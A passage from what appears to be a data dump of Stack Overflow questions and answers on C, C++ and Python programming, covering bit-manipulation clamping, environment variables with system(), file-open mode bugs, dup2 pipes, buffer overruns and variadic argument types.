    color = 0;
}
else if ( color &gt; 4095 ) {
    color = 4095;
}

unsigned char color8bit  = 0xFF &amp; (color &gt;&gt; 4);
/*
 * color8bit is my final value which I would actually use
 * in my application.
 */
</code></pre>

<p>Is there any way this can be done using bit manipulation only, i.e. without using any conditionals? It might help quite a bit in speeding things up as this operation is happening thousands of time in the code.</p>

<p>The following won't help as it doesn't take care of edge cases such as negative values and overflows:</p>

<pre><code>unsigned char color8bit = 0xFF &amp; (( 0x0FFF &amp; color ) &gt;&gt; 4 );
</code></pre>

<p><strong>Edit:</strong> <a href=""http://stackoverflow.com/a/12308926/1044750"">Adam Rosenfield's answer</a> is the one which takes the correct approach but its incorrectly implemented. <a href=""http://stackoverflow.com/a/12309664/1044750"">ouah's answer</a> gives correct results but takes a different approach that what I originally intended to find out.</p>

<p>This is what I ended up using:</p>

<pre><code>const static short min = 0;
const static short max = 4095;
color = min ^ (( min ^ color ) &amp; -( min &lt; color ));
color = max ^ (( color ^ max ) &amp; -( color &lt; max ));
unsigned char color8bit = 0xFF &amp; (( 0x0FFF &amp; color ) &gt;&gt; 4 );
</code></pre>
","9530","","<p>Yes, see <a href=""http://graphics.stanford.edu/~seander/bithacks.html#IntegerMinOrMax"">these bit-twiddling hacks</a>:</p>

<pre><code>short color = ...;
color = color ^ (color &amp; -(color &lt; 0));  // color = max(color, 0)
color = 4096 ^ ((color ^ 4096) &amp; -(color &lt; 4096));  // color = min(color, 4096)

unsigned char color8bit  = 0xFF &amp; (color &gt;&gt; 4);
</code></pre>

<p>Whether this actually turns out to be faster, I don't know -- you should profile.  Most modern x86 and x86-64 chips these days support ""conditional move"" instructions (cmov) which conditionally store a value depending on the EFLAGS status bits, and optimizing compilers will often produce these instructions from ternary expressions like <code>color &gt;= 0 ? color : 0</code>.  Those will likely be fastest, but they won't run on older x86 chips.</p>
"
"<p>I have a program written in C language. In this program, I have an integer variable QS. The value of this variable changes during execution of the program
In this program written in C, I want to display this variable QS using the echo command shell</p>

<p>I heard about the system () function of the diaper C gives hand to use the terminal or console</p>

<p>system (""echo $ QS"") when I do that, the variable QS is not recognized and it displays nothing.</p>

<p>Do you have any specific answers on how I could do this? and how to recognize the variable in C language?</p>

<p>I know that with a simple printf, I can display this variable, but what I want is to use  echo.</p>

<p>Thank you in advance for your answers.</p>
","9530","","<p>The shell you're spawning with the <code>system(3)</code> call has no idea about any of the variables in your C program.  The easiest way to do what you want is to export your data as an environment variable.  Since the environment is inherited by the call to <code>system(3)</code>, you can just set the variable with <a href=""http://linux.die.net/man/3/setenv"" rel=""nofollow""><code>setenv(3)</code></a>.  However, you must first format it as a string:</p>

<pre><code>int QS = ...;
char QSStr[32];  // Longest integer string is INT_MIN = -2147483648, assuming
                 // that sizeof(int) == 4
snprintf(QSStr, sizeof(QSStr), ""%d"", QS);  // Convert to string
setenv(""QS"", QSStr);  // Set the environment variable)
...
system(""echo $QS"");  // Will print the value of QS
</code></pre>
"
"<p>I want to detect if the mouse is currently hidden, something that is often done by 3D applications on Windows. This appears to be trickier than it sounds as I can't find any way to do this.</p>

<p>Preferably I want to do this using Python but if that's not possible I could resort to C. Thanks!</p>
","9530","","<p>You'll need to call the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms648389%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetCursorInfo</code></a> function.  This can be done straightforwardly using the <a href=""http://sourceforge.net/projects/pywin32/"" rel=""nofollow"">pywin32 library</a>.  Or, if you'd rather not install external Python libraries, you can use the <a href=""http://docs.python.org/library/ctypes.html"" rel=""nofollow""><code>ctypes</code> module</a> to directly access the function from User32.dll.</p>

<p>Example:</p>

<pre><code>import ctypes

# Argument structures
class POINT(ctypes.Structure):
    _fields_ = [('x', ctypes.c_int),
                ('y', ctypes.c_int)]

class CURSORINFO(ctypes.Structure):
    _fields_ = [('cbSize', ctypes.c_uint),
                ('flags', ctypes.c_uint),
                ('hCursor', ctypes.c_void_p),
                ('ptScreenPos', POINT)]

# Load function from user32.dll and set argument types
GetCursorInfo = ctypes.windll.user32.GetCursorInfo
GetCursorInfo.argtypes = [ctypes.POINTER(CURSORINFO)]

# Initialize the output structure
info = CURSORINFO()
info.cbSize = ctypes.sizeof(info)

# Call it
if GetCursorInfo(ctypes.byref(info)):
    if info.flags &amp; 0x00000001:
        pass  # The cursor is showing
else:
    pass  # Error occurred (invalid structure size?)
</code></pre>
"
"<p>Is there the opportunity in C++ to write a function definition inline? I am <em>not</em> talking about functions with the keyword <code>inline</code> which is a signal for the compiler.</p>

<p>What I want to do is an inline function <em>referring to the syntax</em>, like in JavaScript where you can write the following code <code>... function(){} ...</code> e.g. as a parameter of another function.</p>
","9530","","<p>C++11 added <a href=""http://en.wikipedia.org/wiki/Anonymous_function#C.2B.2B"">lambda functions</a> to the language.  The previous versions of the language (C++98 and C++03), as well as all current versions of the C language (C89, C99, and C11) do not support this feature.  The syntax looks like:</p>

<pre><code>[capture](parameters)-&gt;return-type{body}
</code></pre>

<p>For example, to compute the sum of all of the elements in a vector:</p>

<pre><code>std::vector&lt;int&gt; some_list;
int total = 0;
for (int i=0;i&lt;5;i++) some_list.push_back(i);
std::for_each(begin(some_list), end(some_list), [&amp;total](int x) {
  total += x;
});
</code></pre>
"
"<p>I'm having a problem in reading and writing a file. I'm reading data from <code>input.txt</code>, calculating (Bytelandian problem) and writing the result to a file.</p>

<p>If I remove the last section of the code,</p>

<pre><code>    /*
    for ( input_counter=0; input_counter&lt;no_of_cases; input_counter++)
    {
        sprintf(buffer, ""%d"", max[input_counter]);
    fputs(buffer, fw);                
    }   
    fclose(fw);
    */
</code></pre>

<p>everything works well (except that I am unable to write to a file). But I am able to compile and run the code.</p>

<p>However on including that code, I get the error ""segmentation error (core dumped)"". Any idea what might be happening?</p>

<pre><code>    #include&lt;stdio.h&gt;  
    #include &lt;stdlib.h&gt;  

    int Calculate_max (int number){
        int counter;
        int store[number+1];
        store[0] = 0;
        if (number&gt;=1){
            store[1] = 1;
        }
        if (number&gt;=2){
            store[2] = 2;
        }

        for (counter=3; counter&lt;=number; counter++){
            store[counter] = store [counter/2] +store[counter/3]+store[counter/4];
            if (store[counter]&lt;counter){
               store[counter]=counter;
            } 
        }
        return store[number];
    }

    int main(void){
        int no_of_cases=0;
        int number[10];
        int max[10];
        int input_counter=0;
        char line [ 128 ];
        char buffer [ 16 ];
        FILE *fr= fopen (""input.txt"", ""rt"");            /* declare the file pointer */
        FILE *fw= fopen (""output.txt"", ""W+"");           /* declare the file pointer */
        if ( fr != NULL )
        {
            if ( fgets ( line, sizeof line, fr ) != NULL ) /* read a line */
        {   
            no_of_cases = atoi (line);
            //printf(""no %d \n"", no_of_cases);
        }       
        if (no_of_cases==0)
        {
            printf(""No Cases!!"");
        }
        else 
        {
            for ( input_counter=0; input_counter&lt;no_of_cases; input_counter++)
            {
                if ( fgets ( line, sizeof line, fr ) != NULL ) 
            {
                number[input_counter] = atoi (line);
                //scanf (line, number[input_counter], ""%d"");
                //printf("" %s \n "" , line);
                //fputs ( line, stdout ); 
            }              
            max[input_counter]= Calculate_max(number[input_counter]);
            //fwrite(max[input_counter],sizeof(int),1,fp);          
            //fprintf(fw, ""%d \n"", max[input_counter]);                
            printf(""%d \n"", max[input_counter]);                
           }            
            }
        fclose(fr); 
        }   
        /*
        for ( input_counter=0; input_counter&lt;no_of_cases; input_counter++)
        {
            sprintf(buffer, ""%d"", max[input_counter]);
        fputs(buffer, fw);                
        }   
        fclose(fw);
        */
    return 0;
    }
</code></pre>

<p>The new code:</p>

<pre><code>    #include&lt;stdio.h&gt;  
    #include &lt;cstdlib&gt;  
    long long Calculate_max ( long long number)
    {
    long long counter;
    long long store[number+1];
    store[0] = 0;
    if (number&gt;=1){
        store[1] = 1;
    }
    if (number&gt;=2){
        store[2] = 2;
    }
    for (counter=3; counter&lt;=number; counter++){
        store[counter] = store [counter/2] +store[counter/3]+store[counter/4];
        if (store[counter]&lt;counter){
            store[counter]=counter;
        }
    }
    return store[number];
    }         
    int main(void)
    {
    int no_of_cases=10;
    long long number;
    long long max[10];
int input_counter=0;
char line [128];
char buffer [ 64 ];
FILE *fr= fopen (""input.txt"", ""rt"");            /* declare the file pointer */
FILE *fw= fopen (""output.txt"", ""w+"");           /* declare the file pointer */
if ( fr != NULL )
{   
    while ( fgets ( line, sizeof line, fr ) != NULL ) 
        {
            //number= atoll (line);
            number=1000000000;              
            max[input_counter]= Calculate_max(number);
            input_counter++;
            printf(""test \n"");
        }              
    fclose(fr);
}   
printf(""writing \n"");
no_of_cases=input_counter;
for ( input_counter=0; input_counter&lt;no_of_cases; input_counter++)
{
    sprintf(buffer, ""%lld"", max[input_counter]);        
    fputs(buffer, fw);                
    fputs(""\n"", fw);                
}   
fclose(fw); 
return 0;
    }
</code></pre>
","9530","","<p>You should really be using a debugger here, it will tell you exactly which line of code is crashing.</p>

<p>I suspect that your problem is that the output file <code>fw</code> is failing to be opened, so the call to <code>fputs(buffer, NULL)</code> is crashing.  You should be checking to make sure that the file is successfully opened, and if it isn't, bail out accordingly.  It's likely failing to open since you're passing an invalid mode string of <code>""W+""</code>.</p>

<p>Try just <code>""w""</code> (lowercase <code>w</code>, not uppercase), since you only need write access, you don't need read-write access (if you do, use <code>""w+""</code> instead).</p>
"
"<p>Here is the question</p>

<p>Find all Pythagorean Triples for side1, side2 and hypotenuse all no longer than 500. Use a triple nested for loops that tries possibilities.</p>

<p>The below is my attempt</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;

using namespace std;

int main()
{
    int side1 = 0;
    int side2 = 0;
    int rightSide = 0;

    cout &lt;&lt; ""Right Side"" &lt;&lt; setw(10) &lt;&lt; ""Side1"" &lt;&lt; setw(10) &lt;&lt; ""Side2"" &lt;&lt; endl;

    for(int i=1;i&lt;=500;i++)
    {
        side1++;
        //cout &lt;&lt; side1 &lt;&lt; endl;

        for(int a=1;a&lt;=500;a++)
        {
            side2++;
            //cout &lt;&lt; ""side 2 "" &lt;&lt; side2 &lt;&lt; endl;

            for(int c=1;c&lt;=500;c++)
            {
                rightSide++;
                int rightSideSqr = rightSide*rightSide;
                int side1Sqr = side1*side1;
                int side2Sqr = side2*side2;

                if(rightSideSqr == side1Sqr+side2Sqr)
                {
                    cout &lt;&lt; rightSideSqr &lt;&lt; setw(15) &lt;&lt; side1 &lt;&lt; setw(10) &lt;&lt; side2 &lt;&lt; endl;
                 }


            }
        }
    }
}
</code></pre>

<p>But it gives no success, seems like an infinite loop. Please help.</p>

<p>Please Note: I am new to C++, I study it by my self. And, this is not an homework, I made the problem statement because it is the best way to express the issue.</p>

<p><strong>EDIT</strong></p>

<p>Right Side     Side1     Side2</p>

<p>RUN SUCCESSFUL (total time: 1s)</p>

<p><strong>EDIT 2</strong></p>

<p>Working code</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;

using namespace std;

int main()
{
    //int side1 = 0;
    //int side2 = 0;
    //int rightSide = 0;

    cout &lt;&lt; ""Right Side"" &lt;&lt; setw(10) &lt;&lt; ""Side1"" &lt;&lt; setw(10) &lt;&lt; ""Side2"" &lt;&lt; endl;

    for(int i=1;i&lt;=500;i++)
    {
        //side1++;
        //cout &lt;&lt; side1 &lt;&lt; endl;

        for(int a=1;a&lt;=500;a++)
        {
            //side2++;
            //cout &lt;&lt; ""side 2 "" &lt;&lt; side2 &lt;&lt; endl;

            for(int c=1;c&lt;=500;c++)
            {
                //rightSide++;
                int rightSideSqr = c*c;
                int side1Sqr = i*i;
                int side2Sqr = a*a;

                if(rightSideSqr == (side1Sqr+side2Sqr))
                {
                    cout &lt;&lt; rightSideSqr &lt;&lt; setw(15) &lt;&lt; i &lt;&lt; setw(10) &lt;&lt; a &lt;&lt; endl;
                 }


            }
        }
    }
}
</code></pre>
","9530","","<p>It's not an infinite loop, it's just a very slow finite loop.  I/O is slow -- you're printing out 500*500 = 250,000 lines of text in the <code>cout</code> statement in the middle loop, and printing out 250,000 lines of text to the console is very, very slow.  If you remove that print statement, it will execute much more quickly.</p>

<p>Secondly, you have an error in your logic.  The variables <code>side1</code>, <code>side2</code>, and <code>rightSide</code> never get reset to 0 at the appropriate times, so they just keep incrementing beyond their intended values.  Try resetting them to 0, or just use the loop counters instead of extra variables like that.</p>
"
"<p>I need a cross platform way of treating memory buffer as <code>FILE*</code>. I have seen other questions which point out that there is no portable way to do this (fmemopen in linux is what I need but it fails on Windows platform).</p>

<p>I have tried using the setvbuf and it seems to work. Can anyone please point out the exact problem of using setvbuf function? </p>

<p>Also , I have seen the C standard draft WG14/N1256 and 7.19.5.6 says:</p>

<blockquote>
  <p>the contents of array at any time are indeterminate.</p>
</blockquote>

<p>I don't understand if I use my own buffer how can its contents be indeterminate?</p>

<p><strong>EDIT</strong>: Thanks for all the answers. Not using this method anymore.</p>
","9530","","<p>No really, there's no portable way to do this.</p>

<p>Using <code>setvbuf</code> may <em>appear</em> to work but you're really invoking undefined behavior, and it will fail in unexpected ways at unexpected times.  The GNU C library does have <a href=""http://linux.die.net/man/3/fmemopen"" rel=""nofollow""><code>fmemopen(3)</code></a> as an extension, as you mentioned, but it's not portable to non-GNU systems.</p>

<p>If you're using some library that requires a <code>FILE*</code> pointer and you only have the required data in memory, you'll just have to write it out to a temporary file and pass in a handle to that file.  Ideally, your library should provide an alternative function that takes a memory pointer instead of a file pointer, but if not, you're out of luck (and you should complain to the library writer about that deficiency).</p>
"
"<p>How can I get a list of running jobs in python.
ie. I basically want the output of the <code>jobs</code> command in a string or list or set.</p>

<p>I am currently trying </p>

<pre><code> p1 = subprocess.Popen(['jobs'], shell=True, stdout=subprocess.PIPE)
 n = p1.communicate()[0].strip()
</code></pre>

<p>But this doesnt seem to be working</p>
","9530","","<p>You have to keep track of it yourself.  The shell keeps track of all of its subprocess jobs, but you're not a shell, so you have to do the tracking yourself.  <code>jobs</code> is a <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Job-Control-Builtins"">Bash shell builtin command</a>, not an actual executable which is run.  When you do <code>subprocess.Popen(['jobs'], shell=True)</code>, you're spawning a new shall and asking <em>it</em> for <em>its</em> jobs, which is of course empty since it's a new shell without any running jobs.</p>

<p>If you can't keep track of your own running jobs, you're going to have a harder time.  On Linux, you could parse <a href=""http://en.wikipedia.org/wiki/Procfs""><code>/proc</code></a> and look for all processes which have you as a parent.  On Windows, you could do <a href=""http://stackoverflow.com/a/558251/9530"">something like this</a> using a wrapper such as pywin32 or the <code>ctypes</code> module to access the Win32 API.</p>
"
"<p>so, I have an assignment for my Operating Systems class wherein i am to create a ring of processes connected with pipes in order to pass messages between them.  i found some example code which i was looking to adapt (or at least understand) for my needs.  the example code (slightly modified) is:</p>

<pre><code>/* Program 4.1 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;

/* Sample C program for generating a unidirectional ring of processes.Invoke this program
 with a command-line arg ument indicating the number of processes on the ring.  Communication
 is done via pipes that connect the standard output of a process to the standard input of
 its successor on the ring.  After the ring is created, each process identifies itself with
 its process ID and the  process ID of its parent.  Each process then exits. */

void main(int argc,  char *argv[ ])
{
int master_pid = getpid();
printf(""master pid: %i\n"", master_pid);

int   i;             /* number of this process (starting with 1)   */
int   childpid;      /* indicates process should spawn another     */
int   nprocs;        /* total number of processes in ring          */
int   fd[2];         /* file descriptors returned by pipe          */
int   error;         /* return value from dup2 call                */
/* check command line for a valid number of processes to generate */
if ( (argc != 2) || ((nprocs = atoi (argv[1])) &lt;= 0) ) {
    fprintf (stderr, ""Usage: %s nprocs\n"", argv[0]);
    exit(1);
}
/* connect std input to std output via a pipe */
if (pipe (fd) == -1) {
    perror(""Could not create pipe"");
    exit(1);
}
printf(""%s\n"", ""test"");
//this section is blocking printf()?
if ((dup2(fd[0], STDIN_FILENO) == -1) ||
    (dup2(fd[1], STDOUT_FILENO) == -1)) {
    perror(""Could not dup pipes"");
    exit(1);
}
printf(""%s\n"", ""test"");

if ((close(fd[0]) == -1) || (close(fd[1]) == -1)) {
    perror(""Could not close extra descriptors"");
    exit(1);
}
/* create the remaining processes with their connecting pipes */
for (i = 1; i &lt; nprocs;  i++) {
    if (pipe (fd) == -1) {
        fprintf(stderr,""Could not create pipe %d: %s\n"",
                i, strerror(errno));
        exit(1);
    }
    if ((childpid = fork()) == -1) {
        fprintf(stderr, ""Could not create child %d: %s\n"",
                i, strerror(errno));
        exit(1);
    }
    if (childpid &gt; 0)        /* for parent process, reassign stdout */
        error = dup2(fd[1], STDOUT_FILENO);
    else
        error = dup2(fd[0], STDIN_FILENO);
    if (error == -1) {
        fprintf(stderr, ""Could not dup pipes for iteration %d: %s\n"",
                i, strerror(errno));
        exit(1);
    }
    if ((close(fd[0]) == -1) || (close(fd[1]) == -1)) {
        fprintf(stderr, ""Could not close extra descriptors %d: %s\n"",
                i, strerror(errno));
        exit(1);
    }
    if (childpid)
        break;
}

/* say hello to the world */
fprintf(stderr,""This is process %d with ID %d and parent id %d\n"",
        i, (int)getpid(), (int)getppid());
wait(1);
exit (0);
}     /* end of main program here */
</code></pre>

<p>which outputs:</p>

<pre><code>master pid: 30593
test
This is process 1 with ID 30593 and parent id 30286
This is process 2 with ID 30594 and parent id 30593
</code></pre>

<p>when i give is 2 as argv[1]</p>

<p>so, I'm wondering, why would the dup2 section prevent the printf() from executing?  if i cant even print something, i'm not sure if i could even pass the message correctly.  also, why would the fprintf() already there work, but not one that i would put there?</p>

<p>edit:  i would take this to my professor/TA, but theyre both out of town and will be unreachable between now and the deadline...</p>
","9530","","<p><code>printf</code> prints to stdout, which is file descriptor 1 (or equivalently <code>STDOUT_FILENO</code>).  <a href=""http://linux.die.net/man/3/dup2"" rel=""nofollow""><code>dup2(3)</code></a> is duplicating the pipe's file descriptor on top of the current stdout, which has the side effect of closing the current stdout.  So, when you try to <code>printf</code> after calling that particular <code>dup2</code>, you're really printing the data into the pipe you just created, which doesn't go to your terminal output.</p>

<p><code>fprintf(stderr, ...)</code> still works because that prints to stderr, not stdout, and the stderr file descriptor (2, or equivalently <code>STDERR_FILENO</code>) does not change during the program, so it continues to print out to the terminal.</p>
"
"<p>I recently took over some C and firmware responsibilities at work, and am having trouble with what seems like a basic issue but one that I can't find the answer to. I'm not very experienced with C, but I've had many years of experience with higher level languages.</p>

<p>The firmware is written for a PIC18F4865 and I can't get it to compile and program correctly. It was originally written on MPLAB IDE 8 using the HI-TECH PICC18 compiler, but I moved up to MPLAB X IDE and have been having problems.</p>

<p>First, I was using the same HI-TECH PICC18 compiler and it appeared to program successfully, but the device was not reading correctly. I then switched to the XC8 compiler and began to get an error message during compile that I can't get around.</p>

<pre><code>C:/_Sable/Firmware_C/lib\eeprom.h:10: error: no identifier in declaration
C:/_Sable/Firmware_C/lib\eeprom.h:10: error: "";"" expected
</code></pre>

<p>The eeprom.h file is</p>

<pre><code>#ifndef _EEPROM_H_
#define _EEPROM_H_

#define EE_ADDR(member) (offsetof(struct ee_map_s, (member)))

extern unsigned char eeprom_read(unsigned int); // this is line 10
extern void eeprom_write(unsigned int, unsigned char);
extern void ee_read(unsigned char, void *vp, unsigned char);
extern void ee_write(unsigned char, void *vp, unsigned char);

#endif
</code></pre>

<p>I looked around online and saw that this error can occur in a previous included file, and I checked that file and all appeared to be fine. I even rearranged the include order, think that the error message would change if that was the case, but the error still complains about this line.</p>

<p>I then thought maybe the function declaration was invalid because none of the parameters are named, so I changed line 10 to:</p>

<pre><code>extern unsigned char eeprom_read(unsigned int addr)
</code></pre>

<p>This didn't change anything. But I did have a weird feeling that when I cleaned and built again, it was not re-compiling eeprom.h. I don't know if that happens or how to force it to recompile.</p>

<p>I don't know if fixing this will fix the firmware issues I'm having or if I need to go back to MPLAB IDE 8, but it is still something I'd like to fix.</p>
","9530","","<p>Some header file is using a macro to <code>#define eeprom_read</code> into something else, possibly the empty string.  If you use a different function name, <code>#undef eeprom_read</code>, or do something else to cause the header to no longer make that macro, it should work.</p>
"
"<p>Implemention of Sutherland-Hodgeman polygon clipping. This order of declaration of these 2 statements gives correct output, reverse does not.</p>

<pre><code>int numberOfVertices = 5;
Point pointList[] = { {50,50}, {200,300}, {310,110}, {130,90}, {70,40} };
</code></pre>

<p>The exact error which comes when the declarations are reversed is that the bottom clipper, produces an empty set of vertices so no polygon is displayed after clipping.</p>

<p>What is the reason for this error?</p>

<p>Code:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;GL/glut.h&gt;
#define MAXVERTICES 10
#define LEFT 0
#define RIGHT 1
#define TOP 2
#define BOTTOM 3
using namespace std;

/* Clipping window */
struct Window {
    double xmin;
    double xmax;
    double ymin;
    double ymax;
};

struct Point {
    double x;
    double y;
};

/* If I interchange these two lines, the code doesn't work. */
/**************/
int numberOfVertices = 5;
Point pointList[] = { {50,50}, {200,300}, {310,110}, {130,90}, {70,40} };
/**************/
const Window w = { 100, 400, 60, 200 };

/* Checks whether a point is inside or outside a window side */
int isInside(Point p, int side) {
    switch(side) {
        case LEFT:
            return p.x &gt;= w.xmin;
        case RIGHT:
            return p.x &lt;= w.xmax;
        case TOP:
            return p.y &lt;= w.ymax;
        case BOTTOM:
            return p.y &gt;= w.ymin;
    }
}

/* Calculates intersection of a segment and a window side */
Point intersection(Point p1, Point p2, int side) {
    Point temp;
    double slope, intercept;
    bool infinite;

    /* Find slope and intercept of segment, taking care of inf slope */
    if(p2.x - p1.x != 0) {
       slope = (p2.y - p1.y) / (p2.x - p1.x);
       infinite = false;
    } else {
        infinite = true;
    }

    intercept = p1.y - p1.x * slope;

    /* Calculate intersections */
    switch(side) {
        case LEFT:
            temp.x = w.xmin;
            temp.y = temp.x * slope + intercept;
            break;
        case RIGHT:
            temp.x = w.xmax;
            temp.y = temp.x * slope + intercept;
            break;
        case TOP:
            temp.y = w.ymax;
            temp.x = infinite ? p1.x : (temp.y - intercept) / slope;
            break;
        case BOTTOM:
            temp.y = w.ymin;
            temp.x = infinite ? p1.x : (temp.y - intercept) / slope;
            break;
    }

    return temp;
}

/* Clips polygon against a side, updating the point list
(called once for each side) */
void clipAgainstSide(int sideToClip) {
    int i, j=0;
    Point s,p;
    Point outputList[MAXVERTICES];

    /* Main algorithm */
    s = pointList[numberOfVertices-1];
    for(i=0 ; i&lt;numberOfVertices ; i++) {
        p = pointList[i];

        if(isInside(p, sideToClip)) {
            /* p inside */
            if(!isInside(s, sideToClip)) {
                /* p inside, s outside */
                outputList[j] = intersection(p, s, sideToClip);
                j++;
            }
            outputList[j] = p;
            j++;
        }
        else if(isInside(s, sideToClip)) {
            /* s inside, p outside */
            outputList[j] = intersection(s, p, sideToClip);
            j++;
        }

        s = p;
    }

    /* Updating number of points and point list */
    numberOfVertices = j;

    /* ERROR: In last call with BOTTOM argument, numberOfVertices becomes 0 */
/* all earlier 3 calls have correct output */
    cout&lt;&lt;numberOfVertices&lt;&lt;endl;

    for(i=0 ; i&lt;numberOfVertices ; i++) {
        pointList[i] = outputList[i];
    }
}

void SutherlandHodgemanPolygonClip() {    
    clipAgainstSide(LEFT);
    clipAgainstSide(RIGHT);
    clipAgainstSide(TOP);
    clipAgainstSide(BOTTOM);
}

void init() {
    glClearColor(1,1,1,0);
    glMatrixMode(GL_PROJECTION);
    gluOrtho2D(0,1000,0,500);
}

void display() {
    glClear(GL_COLOR_BUFFER_BIT);

    /* Displaying ORIGINAL box and polygon */
    glColor3f(0,0,1);
    glBegin(GL_LINE_LOOP);
        glVertex2i(w.xmin, w.ymin);
        glVertex2i(w.xmin, w.ymax);
        glVertex2i(w.xmax, w.ymax);
        glVertex2i(w.xmax, w.ymin);
    glEnd();

    glColor3f(1,0,0);
    glBegin(GL_LINE_LOOP);
        for(int i=0 ; i&lt;numberOfVertices ; i++) {
            glVertex2i(pointList[i].x, pointList[i].y);
        }
    glEnd();

    /* Clipping */
    SutherlandHodgemanPolygonClip();

    /* Displaying CLIPPED box and polygon, 500px right */
    glColor3f(0,0,1);
    glBegin(GL_LINE_LOOP);
        glVertex2i(w.xmin+500, w.ymin);
        glVertex2i(w.xmin+500, w.ymax);
        glVertex2i(w.xmax+500, w.ymax);
        glVertex2i(w.xmax+500, w.ymin);
    glEnd();

    glColor3f(1,0,0);
    glBegin(GL_LINE_LOOP);
        for(int i=0 ; i&lt;numberOfVertices ; i++) {
            glVertex2i(pointList[i].x+500, pointList[i].y);
        }
    glEnd();

    glFlush();
}

int main(int argc, char** argv) {
    glutInit(&amp;argc, argv);
    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);
    glutInitWindowSize(1000,500);
    glutCreateWindow(""Sutherland-Hodgeman polygon clipping"");

    init();
    glutDisplayFunc(display);
    glutMainLoop();

    return 0;
}
</code></pre>
","9530","","<p>You have a memory stomping bug -- you're writing the <code>pointList</code> array with an invalid index, which overwrites the memory immediately afterwards.  Your original code just happens to work, because the memory after it isn't used, but when you switch the order of declarations, the memory stomping overwrites the variable <code>numberOfVertices</code>.</p>

<p>I'd suggest running your program with Valgrind to find where the memory stomping is occurring.</p>
"
"<pre><code>C++locale.h
-&gt;Semantic Issue
--&gt;Use of undeclared identifier 'va_start'
-&gt;Semantic Issue
--&gt;Use of undeclared identifier 'va_end'
</code></pre>

<p>First time using boost, downloaded it using ports and created a command line project in XCode.
Header Search Path: /usr/include/**</p>

<p>There is nothing in the code yet, just the main function that comes with the default proj.</p>

<p>Just don't know what to do, never expected this to happen.</p>

<p>EDIT1:</p>

<p>First occurrence:</p>

<pre><code>#ifndef _GLIBCXX_CSTDARG
#define _GLIBCXX_CSTDARG 1

#pragma GCC system_header

#include &lt;bits/c++config.h&gt;
#include &lt;stdarg.h&gt;

// Adhere to section 17.4.1.2 clause 5 of ISO 14882:1998
#ifndef va_end
#define va_end(ap) va_end (ap)
#endif

_GLIBCXX_BEGIN_NAMESPACE(std)

  using ::va_list;

_GLIBCXX_END_NAMESPACE

#endif
</code></pre>

<p>It's a file without extension in \usr\include\c++\4.2.1 and i just realized that this file has nothing to do with boost, there is something nasty happening here.</p>

<p>EDIT2: After fixing the include dir to /opt/local/include/** new errors appeared:</p>

<pre><code>/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/c++/v1/type_traits:214:46:
Use of undeclared identifier 'nullptr_t'; did you mean 'nullptr'?
</code></pre>

<p>There are other errors, all related to these files in the folder sr/lib/c++/v1/ why is that? These file seems to be some core functionality, they can't be broke.</p>

<p>Here is a pic of the errors, maybe ou guys see something
<img src=""http://i.stack.imgur.com/OSGZu.png"" alt=""Errors""></p>

<p>EDIT3: Changing the compiler from Apple LLVM to GCC LLVM reduces the errors to only one:
""vspintf is not a member of 'std'"" in c++locale.h. Ok, now I'm completely lost. </p>
","9530","","<p>You need to <code>#include &lt;stdarg.h&gt;</code> in order to use the <code>va_start</code> macros et al.  If those errors are happening in a header file, then that header file should include <code>&lt;stdarg.h&gt;</code>; if it doesn't, you can work around it by including it yourself <em>before</em> you include the problematic header (but you should also report the issue to the library developers, if possible).</p>
"
"<p>If we see the below code, fun function converts C's object into B's object and calls B' own function. How doesn't it give segm fault. I think this will lead to crash. 
My program is not crashed. Can any one explains why is it working fine.</p>

<pre><code>#include&lt;iostream&gt;
using namespace std;
class A{
public:
   A() {cout&lt;&lt;""A's Con\n""; }
   ~A() {cout&lt;&lt;""A's De\n""; }
};
class B :public A
{
public:
   B() {cout&lt;&lt;""B's Con\n""; }
   ~B() {cout&lt;&lt;""B's De\n""; }
   void printb(){cout&lt;&lt;""B print function\n"";}
   void printb2(){cout&lt;&lt;""B print2 function\n"";}
};
class C :public A
{
public:
   C() {cout&lt;&lt;""C's Con\n""; }
   ~C() {cout&lt;&lt;""C's De\n""; }
   void printc(){cout&lt;&lt;""C print function\n"";}
};
void fun(A *ap)
{
   B *bp = (B*) ap;
   bp-&gt;printb2();
}

int main()
{
   C c;
   fun(&amp;c);
   return 0;
}
</code></pre>
","9530","","<p>You're invoking undefined behavior.  The first rule about undefined behavior is that <em>anything could happen</em>.  Your program might crash, or it might work successfully.  It might <em>appear</em> to work successfully and then crash hours later in an ""impossible"" way.  It might even send inappropriate emails to your boss or erase your hard drive.  That's certainly unlikely for a random benign error, but if your program is, say, a web browser, it could certainly be exploited to do whatever an attacker might want.</p>

<p>Never rely on undefined behavior.  Always fix the underling issues.  Use tools like <a href=""http://valgrind.org/"" rel=""nofollow"">Valgrind</a>, <a href=""http://msdn.microsoft.com/en-us/library/ms220948%28v=vs.90%29.aspx"" rel=""nofollow"">Application Verifier</a>, etc. to help you catch subtle errors that don't always result in crashes.  It will make your software much more reliable in the long run.</p>
"
"<p>When I run this sample program using va_arg(ap,double), I found va_arg return invalid data, as 0 instead of 3 or 1.2 instead of 1, such that if I pass integer value without .00 instead of double format it get a garbage data (ie 3 instead of 3.00)!!! </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdarg.h&gt;
void func(int s){
    printf(""%s: %d\n"",__func__,s);
}

void var(int count,...){
    va_list ap;
    va_start(ap,count);
    double a = va_arg(ap,double);
    printf(""%f\n"",a);
    va_end(ap);

}

void main(void ) {
    printf(""%s,%d,%s\n"",__FILE__,__LINE__,__DATE__);
    func(__LINE__);
    var(1,3);
    var(1,1.2);
    var(1,1);

}
</code></pre>

<p>The Output is:</p>

<pre><code>try.c,24,Sep 25 2012
func: 25
0.000000
1.200000
1.200000
</code></pre>
","9530","","<p>Variadic functions (that is, functions which take a variable number of arguments indicated by the ellipsis (<code>...</code>) parameter) have weak typing in C.  Except in the case of certain special functions like <code>printf</code> and <code>scanf</code>, the compiler makes no effort to verify that you're passing the correct types of arguments to them.</p>

